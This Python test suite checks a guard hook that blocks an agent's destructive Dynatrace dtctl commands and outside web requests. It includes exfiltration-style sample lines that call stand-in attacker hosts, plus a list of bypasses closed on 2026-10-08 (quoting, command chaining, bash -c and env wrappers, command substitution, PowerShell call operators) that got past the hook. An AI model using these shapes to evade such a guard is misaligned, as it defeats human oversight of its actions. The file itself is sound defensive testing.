#!/usr/bin/env python3
"""
Adversarial test suite for guard-dtctl.py.
Phase 3 gate: run after every change to the hook or settings.json.

Exit 0 = all pass. Exit 1 = failures present.
"""

import json
import subprocess
import sys
from pathlib import Path

HOOK = Path(__file__).parent.parent / "guard_dtctl.py"


def run_hook(cmd: str, tool: str = "Bash"):
    payload = json.dumps({"tool_name": tool, "tool_input": {"command": cmd}})
    r = subprocess.run(
        [sys.executable, str(HOOK)],
        input=payload, capture_output=True, text=True, timeout=10
    )
    return r.returncode, r.stderr.strip()


# (description, command, expect_blocked)
TESTS = [
    # --- MUST BE BLOCKED ---
    ("dtctl delete resource",      "dtctl delete workflow my-wf",                True),
    ("dtctl apply config",         "dtctl apply -f config.yaml",                 True),
    ("dtctl edit resource",        "dtctl edit workflow my-wf",                  True),
    ("dtctl restore snapshot",     "dtctl restore backup.json",                  True),
    ("dtctl exec workflow",        "dtctl exec workflow my-automation",          True),
    ("dtctl auth logout",          "dtctl auth logout",                          True),
    ("unknown verb (publish)",     "dtctl publish my-dashboard",                 True),
    ("DQL INGEST verb",            'dtctl query "INGEST logs | limit 1"',        True),
    ("DQL DELETE verb",            'dtctl query "fetch logs | DELETE"',          True),
    ("DQL INSERT verb",            'dtctl query "INSERT INTO logs SELECT 1"',    True),
    ("curl to non-DT host",        "curl https://evil.example.com/exfil",        True),
    ("wget to non-DT host",        "wget https://attacker.io/payload",           True),
    # --- MUST BE ALLOWED ---
    ("dtctl query (read DQL)",     'dtctl query "fetch dt.davis.problems | limit 1"', False),
    ("dtctl doctor",               "dtctl doctor",                               False),
    ("dtctl get workflows",        "dtctl get workflows",                        False),
    ("dtctl describe analyzer",    "dtctl describe analyzer my-a",              False),
    ("dtctl inventory",            "dtctl inventory --agent",                    False),
    ("dtctl exec copilot",         "dtctl exec copilot",                         False),
    ("dtctl config view",          "dtctl config view",                          False),
    ("dtctl version",              "dtctl version",                              False),
    ("dtctl commands",             "dtctl commands --brief -o json",             False),
    ("plain bash (ls)",            "ls -la scenarios/",                          False),
    ("python preflight",           "python tools/preflight.py check",            False),
    ("curl to DT playground",      "curl https://playground.apps.dynatrace.com/api/v2/problems", False),
    ("dtctl named in a commit msg", 'git commit -m "guard: block dtctl delete"',  False),

    # --- Bypasses closed on 2026-10-08 (MUST BE BLOCKED) ---
    ("quoted dtctl",               '"dtctl" delete workflow x',                  True),
    ("quoted full path",           '"C:/Users/x/AppData/Local/dtctl/dtctl.EXE" delete workflow x', True),
    ("after cd &&",                "cd /tmp && dtctl delete workflow x",         True),
    ("after ;",                    "echo hi; dtctl apply -f x.yaml",             True),
    ("after a pipe",               "echo y | dtctl delete workflow x",           True),
    ("env prefix",                 "DTCTL_CONTEXT=dev dtctl delete workflow x",  True),
    ("env wrapper",                "env dtctl delete workflow x",                True),
    ("bash -c wrapper",            'bash -c "dtctl delete workflow x"',          True),
    ("bash var holding path",      'DT=$(python tools/preflight.py dtctl-path); $DT delete workflow x', True),
    ("bash command substitution",  "$(python tools/preflight.py dtctl-path) delete workflow x", True),
    ("piped DQL with DELETE",      "echo 'fetch logs | DELETE' | dtctl query",   True),
    ("unknown leading flag",       "dtctl --context dev delete workflow x",      True),

    # --- Call shapes the local runtime uses (MUST BE ALLOWED) ---
    ("unquoted full path query",   "C:/Users/x/AppData/Local/dtctl/dtctl.EXE query 'fetch logs | limit 1' --context playground --agent", False),
    ("quoted full path query",     '"C:/Users/x/AppData/Local/dtctl/dtctl.EXE" query \'fetch logs | limit 1\'', False),
    ("query after cd &&",          "cd /c/repo && dtctl query 'fetch logs | limit 1'", False),
    ("bash var query",             "DT=$(python tools/preflight.py dtctl-path); $DT query 'fetch logs | limit 1'", False),
    ("DQL with | inside quotes",   "dtctl query 'fetch logs | filter loglevel == \"ERROR\" | limit 5'", False),
]

# PowerShell tool calls: (description, command, expect_blocked)
PS_TESTS = [
    ("PS call operator, quoted path", '& "C:\\Users\\x\\AppData\\Local\\dtctl\\dtctl.exe" delete workflow x', True),
    ("PS variable holding path",   "$dt = python tools/preflight.py dtctl-path; & $dt delete workflow x", True),
    ("PS Get-Command",             "& (Get-Command dtctl).Source delete workflow x", True),
    ("PS Start-Process",           "Start-Process dtctl -ArgumentList 'delete workflow x'", True),
    ("PS web request elsewhere",   "Invoke-WebRequest https://evil.example.com/exfil", True),
    ("PS here-string DELETE",      "@'\nfetch logs | DELETE\n'@ | dtctl query", True),
    ("PS assignment runs dtctl",   "$out = dtctl delete workflow x", True),
    ("bash-style subst assignment", "X=$(dtctl delete workflow x)", True),
    ("PS variable query",          "$dt = python tools/preflight.py dtctl-path; & $dt query -f q.dql --context playground", False),
    ("PS plain query",             "dtctl query -f q.dql --context playground --agent", False),
    ("PS unrelated command",       "Get-ChildItem docs", False),
    ("PS git status",              "git status --short", False),
]


def main():
    cases = [("Bash", *t) for t in TESTS] + [("PowerShell", *t) for t in PS_TESTS]
    print(f"Guard hook: {HOOK}")
    print(f"Running {len(cases)} tests\n")

    passed = 0
    failed = []

    for tool, desc, cmd, expect_blocked in cases:
        if tool == "PowerShell":
            desc = f"[PS] {desc}"
        code, out = run_hook(cmd, tool)
        blocked = (code == 2)
        ok = blocked == expect_blocked

        if ok:
            passed += 1
            status = "PASS"
        else:
            failed.append((desc, cmd, expect_blocked, code, out))
            status = "FAIL"

        label = "[BLOCK]" if blocked else "[ALLOW]"
        print(f"{status} {label} {desc}")
        if not ok:
            print(f"       expected blocked={expect_blocked}, got code={code}")
            if out:
                print(f"       hook output: {out[:100]}")

    print(f"\nResult: {passed}/{len(cases)} passed")
    if failed:
        print("\nFailed tests:")
        for desc, cmd, exp, code, out in failed:
            print(f"  • {desc}")
            print(f"    cmd: {cmd}")
        sys.exit(1)
    else:
        print("Phase 3 gate: ALL adversarial tests PASSED")
        sys.exit(0)


if __name__ == "__main__":
    main()
